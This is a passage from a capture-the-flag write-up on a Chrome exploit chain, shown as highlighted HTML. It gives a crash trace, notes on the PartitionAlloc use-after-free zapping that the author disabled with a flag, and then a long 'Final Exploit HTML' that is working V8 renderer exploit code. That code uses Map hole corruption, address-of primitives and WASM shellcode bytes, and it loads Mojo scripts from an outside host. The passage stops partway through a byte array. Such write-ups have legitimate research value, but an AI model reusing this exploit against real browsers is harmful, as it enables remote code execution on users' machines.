+#3 0x7f2179098140 (/usr/lib/x86_64-linux-gnu/libpthread-2.31.so+0x1313f)
+#4 0x55fa3fd520e4 content::SandboxImpl::Pour()
+#5 0x55fa41584f81 base::TaskAnnotator::RunTaskImpl()
+#6 0x55fa4159d2cd base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl()
+#7 0x55fa4159cbbf base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()
+#8 0x55fa4159da55 base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()
+#9 0x55fa415f8193 base::MessagePumpEpoll::Run()
+#10 0x55fa4159ddab base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run()
+#11 0x55fa41563db9 base::RunLoop::Run()
+#12 0x55fa415bd098 base::Thread::Run()
+#13 0x55fa3f6d8a60 content::BrowserProcessIOThread::IOThreadRun()
+#14 0x55fa415bd1b7 base::Thread::ThreadMain()
+#15 0x55fa415e494f base::(anonymous namespace)::ThreadFunc()
+#16 0x7f217908cea7 start_thread
+#17 0x7f21780afa2f clone
+</span>  <span class="n">r8</span><span class="o">:</span> <span class="mo">00001</span><span class="n">b6802012300</span>  <span class="n">r9</span><span class="o">:</span> <span class="mo">00007</span><span class="n">f217080e06f</span> <span class="n">r10</span><span class="o">:</span> <span class="mo">0000000000010001</span> <span class="n">r11</span><span class="o">:</span> <span class="mo">0000000000000001</span>
+ <span class="n">r12</span><span class="o">:</span> <span class="mo">00001</span><span class="n">b68010c7c20</span> <span class="n">r13</span><span class="o">:</span> <span class="mo">0000000000000</span><span class="mi">800</span> <span class="n">r14</span><span class="o">:</span> <span class="mo">00001</span><span class="n">b68010c6c00</span> <span class="n">r15</span><span class="o">:</span> <span class="n">efefefefefefefef</span>
+  <span class="n">di</span><span class="o">:</span> <span class="mo">000055</span><span class="n">fa47c6ccc8</span>  <span class="n">si</span><span class="o">:</span> <span class="mo">00001</span><span class="n">b6801f32300</span>  <span class="n">bp</span><span class="o">:</span> <span class="mo">00007</span><span class="n">f217080e140</span>  <span class="n">bx</span><span class="o">:</span> <span class="mo">00001</span><span class="n">b6801cc8000</span>
+  <span class="n">dx</span><span class="o">:</span> <span class="mo">0000000000000</span><span class="mi">800</span>  <span class="n">ax</span><span class="o">:</span> <span class="mo">00001</span><span class="n">b6802012b20</span>  <span class="n">cx</span><span class="o">:</span> <span class="mo">0000000000000000</span>  <span class="n">sp</span><span class="o">:</span> <span class="mo">00007</span><span class="n">f217080e0f0</span>
+  <span class="n">ip</span><span class="o">:</span> <span class="mo">000055</span><span class="n">fa3fd520e4</span> <span class="n">efl</span><span class="o">:</span> <span class="mo">00000000000102</span><span class="mi">82</span> <span class="n">cgf</span><span class="o">:</span> <span class="mo">002</span><span class="n">b000000000033</span> <span class="n">erf</span><span class="o">:</span> <span class="mo">0000000000000000</span>
+ <span class="n">trp</span><span class="o">:</span> <span class="mx">000000000000000d</span> <span class="n">msk</span><span class="o">:</span> <span class="mo">0000000000000000</span> <span class="n">cr2</span><span class="o">:</span> <span class="mo">0000000000000000</span>
+<span class="p">[</span><span class="n">end</span> <span class="n">of</span> <span class="n">stack</span> <span class="n">trace</span><span class="p">]</span>
+<span class="n">Segmentation</span> <span class="n">fault</span>
+</code></pre></div></div>
+
+<p>Looking at the assembly, the culprit was R15.
+I compared the crashlog to one without GUI and there the exploit would always succeed or R15 was null or <code class="language-plaintext highlighter-rouge">0x20</code>.
+I realized, that when the GUI was enabled, there must be some UAF detection happening, by memsetting free’d chunks to <code class="language-plaintext highlighter-rouge">0xef</code>.
+After scouring the chromium codebase for a few hours (and wasting a lot of time trying to make it work with different timings of the race), I finally figured out that it is their new partition allocator:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">// TODO(keishi): Add PA_LIKELY when brp is fully enabled as |brp_enabled| will</span>
+  <span class="c1">// be false only for the aligned partition.</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">brp_enabled</span><span class="p">())</span> <span class="p">{</span>
+    <span class="k">auto</span><span class="o">*</span> <span class="n">ref_count</span> <span class="o">=</span> <span class="n">internal</span><span class="o">::</span><span class="n">PartitionRefCountPointer</span><span class="p">(</span><span class="n">slot_start</span><span class="p">);</span>
+    <span class="c1">// If there are no more references to the allocation, it can be freed</span>
+    <span class="c1">// immediately. Otherwise, defer the operation and zap the memory to turn</span>
+    <span class="c1">// potential use-after-free issues into unexploitable crashes.</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">PA_UNLIKELY</span><span class="p">(</span><span class="o">!</span><span class="n">ref_count</span><span class="o">-&gt;</span><span class="n">IsAliveWithNoKnownRefs</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
+                    <span class="n">brp_zapping_enabled</span><span class="p">()))</span>
+      <span class="n">internal</span><span class="o">::</span><span class="n">SecureMemset</span><span class="p">(</span><span class="n">object</span><span class="p">,</span> <span class="n">internal</span><span class="o">::</span><span class="n">kQuarantinedByte</span><span class="p">,</span>
+                             <span class="n">slot_span</span><span class="o">-&gt;</span><span class="n">GetUsableSize</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>I did not figure out whether this is just not enabled when running with <code class="language-plaintext highlighter-rouge">--headless</code> or the GUI just causes the memset to happen due to other factors.
+In the end, I decided to just disable the new allocator with a command line flag<sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote" rel="footnote">2</a></sup>.</p>
+
+<p>With all of that fixed, the exploit finally worked when running under a GUI and we were able to capture this glorious video :P (I recommend you turn on sound):</p>
+
+<video width="100%" controls="controls">
+  <source src="./img/fourchain_gui.mp4" />
+</video>
+
+<h2 id="final-exploit-html">Final Exploit HTML</h2>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://chain.galli.me:8080/mojo/mojo_bindings.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://chain.galli.me:8080/mojo/third_party/blink/public/mojom/sandbox/sandbox.mojom.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">const</span> <span class="nx">server_url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">http://chain.galli.me:8080</span><span class="dl">'</span>
+<span class="kd">let</span> <span class="nx">printbuf</span> <span class="o">=</span> <span class="p">[];</span>
+<span class="kd">function</span> <span class="nx">print</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">printbuf</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">let</span> <span class="nx">f64view</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">u8view</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">f64view</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">u64view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">f64view</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">i32view</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Int32Array</span><span class="p">(</span><span class="nx">f64view</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">u32view</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">f64view</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">d2i</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">f64view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">u64view</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">u64view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">f64view</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">s2u</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">i32view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">u32view</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="s2">`0x</span><span class="p">${</span><span class="nx">x</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)}</span><span class="s2">`</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">assert</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">msg</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">throw</span> <span class="nx">msg</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">async</span> <span class="kd">function</span> <span class="nx">renderer</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">hole</span> <span class="o">=</span> <span class="p">[].</span><span class="nx">hole</span><span class="p">();</span>
+  <span class="kd">let</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Map</span><span class="p">();</span> <span class="c1">// len = 0, 2 buckets</span>
+  <span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// len = 1, 2 buckets</span>
+  <span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">hole</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// len = 2, 2 buckets</span>
+  <span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span> <span class="c1">// len = 2, 2 buckets</span>
+  <span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span> <span class="c1">// len = 0x00048b55, 2 buckets, 2 deleted, pointed to map has len = 0, no deleted, 2 buckets</span>
+  <span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// len = 0x00048b55, 2 buckets, 2 deleted, points to another map, points to something with len = -1</span>
+  <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[];</span>
+  <span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// set the number of buckets to 0x10</span>
+
+  <span class="nx">a</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="mf">1.1</span><span class="p">);</span>
+
+  <span class="kd">let</span> <span class="nx">b</span> <span class="o">=</span> <span class="p">[];</span>
+  <span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span> <span class="mi">1337</span><span class="p">);</span> <span class="c1">// overwrite the length of the array</span>
+
+  <span class="kd">let</span> <span class="nx">c</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+  <span class="nx">a</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i2d</span><span class="p">(</span><span class="mh">0x1337133700000000</span><span class="nx">n</span><span class="p">);</span>
+
+
+  <span class="kd">let</span> <span class="nx">d</span> <span class="o">=</span> <span class="p">[</span><span class="nx">a</span><span class="p">];</span>
+  <span class="kd">let</span> <span class="nx">e</span> <span class="o">=</span> <span class="p">[</span><span class="nx">d</span><span class="p">];</span>
+
+  <span class="kd">let</span> <span class="nx">d_addr</span> <span class="o">=</span> <span class="nx">c</span><span class="p">[</span><span class="mi">46</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="nx">a</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i2d</span><span class="p">(</span><span class="mi">0</span><span class="nx">n</span><span class="p">);</span>
+  <span class="nx">a</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i2d</span><span class="p">(</span><span class="mi">0</span><span class="nx">n</span><span class="p">);</span>
+
+  <span class="kd">let</span> <span class="nx">d_elements</span> <span class="o">=</span> <span class="nx">c</span><span class="p">[</span><span class="nx">d_addr</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="kd">function</span> <span class="nx">cageAddressOf</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">d</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
+      <span class="k">return</span> <span class="nx">c</span><span class="p">[</span><span class="nx">d_elements</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">var</span> <span class="nb">global</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Global</span><span class="p">({</span><span class="na">value</span><span class="p">:</span><span class="dl">'</span><span class="s1">i64</span><span class="dl">'</span><span class="p">,</span> <span class="na">mutable</span><span class="p">:</span><span class="kc">true</span><span class="p">},</span> <span class="mi">0</span><span class="nx">n</span><span class="p">);</span>
+  <span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">224</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">218</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">184</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">184</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">193</span><span class="p">,</span><span class="mi">226</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">235</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">208</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">235</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">235</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">195</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">235</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">193</span><span class="p">,</span><span class="mi">224</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">235</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">194</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">235</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">137</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">195</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">235</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">171</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
+  <span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
+  <span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">,</span> <span class="p">{</span><span class="na">js</span><span class="p">:</span> <span class="p">{</span><span class="nb">global</span><span class="p">}});</span>
+  <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">meme</span><span class="p">;</span>
+
+  <span class="nx">f</span><span class="p">(</span><span class="mh">0x13371337</span><span class="p">,</span> <span class="mh">0x13381338</span><span class="p">);</span>
+  <span class="kd">const</span> <span class="nx">code_addr</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">c</span><span class="p">[</span><span class="nx">cageAddressOf</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">24</span><span class="p">])</span> <span class="o">|</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">c</span><span class="p">[</span><span class="nx">cageAddressOf</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">25</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+
+  <span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="kd">function</span> <span class="nx">makeInstance</span><span class="p">()</span> <span class="p">{</span>
+      <span class="kd">var</span> <span class="nx">global2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Global</span><span class="p">({</span><span class="na">value</span><span class="p">:</span><span class="dl">'</span><span class="s1">i64</span><span class="dl">'</span><span class="p">,</span> <span class="na">mutable</span><span class="p">:</span><span class="kc">true</span><span class="p">},</span> <span class="mi">0</span><span class="nx">n</span><span class="p">);</span>
+      <span class="kd">var</span> <span class="nx">wasm_code2</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">136</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">142</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">238</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">232</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">184</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">184</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">184</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">192</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">94</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">192</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">160</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">116</span><span 